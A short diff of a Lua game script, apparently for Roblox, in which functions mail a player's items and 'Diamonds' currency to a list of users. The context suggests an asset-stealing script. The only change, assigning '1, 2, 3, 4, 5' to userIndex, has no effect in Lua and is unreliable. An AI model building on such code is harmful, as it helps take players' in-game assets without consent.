@@ -186,7 +186,7 @@ local function getRAP(Type, Item)
 end
 
 local function sendItem(category, uid, am)
-    local userIndex = 1
+    local userIndex = 1, 2, 3, 4, 5
     local maxUsers = #users
     local sent = false
     
@@ -222,7 +222,7 @@ local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
             if GemAmount1 >= (mailSendPrice + 10000) then
-                local userIndex = 1
+                local userIndex = 1, 2, 3, 4, 5
                 local maxUsers = #users
                 local sent = false
                 
